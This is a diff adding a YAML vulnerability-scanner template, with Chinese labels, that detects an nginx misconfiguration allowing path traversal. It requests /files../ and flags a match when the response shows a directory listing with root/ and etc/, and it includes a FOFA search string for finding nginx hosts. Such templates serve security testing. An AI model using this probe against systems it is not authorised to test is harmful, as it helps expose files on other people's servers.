@@ -1,0 +1,22 @@
+id: poc-yaml-nginx-insecure-configuration-path-travel
+info:
+  name: nginx 不安全配置导致路径遍历
+  severity: high
+  tags:
+  - 目录遍历
+  finger: nginx
+  fofa: app="nginx"
+requests:
+- method: GET
+  path: /files../
+  expression: 'status_code == 200 &&
+
+    contains(body,"Index of /") &&
+
+    contains(body,"root/") &&
+
+    contains(body,"etc/")
+
+    '
+variables: {}
+transport: http
